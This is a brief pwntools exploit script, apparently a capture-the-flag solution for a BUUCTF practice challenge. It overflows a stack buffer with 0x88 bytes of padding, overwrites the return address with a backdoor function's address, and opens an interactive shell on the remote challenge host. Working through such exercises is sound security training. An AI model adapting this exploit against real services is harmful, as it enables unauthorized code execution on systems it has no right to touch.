from pwn import *


p = remote("node4.buuoj.cn", 27940)

back_door = 0x00400620

pad = cyclic(0x88)+p64(back_door)
p.send(pad)

p.interactive()

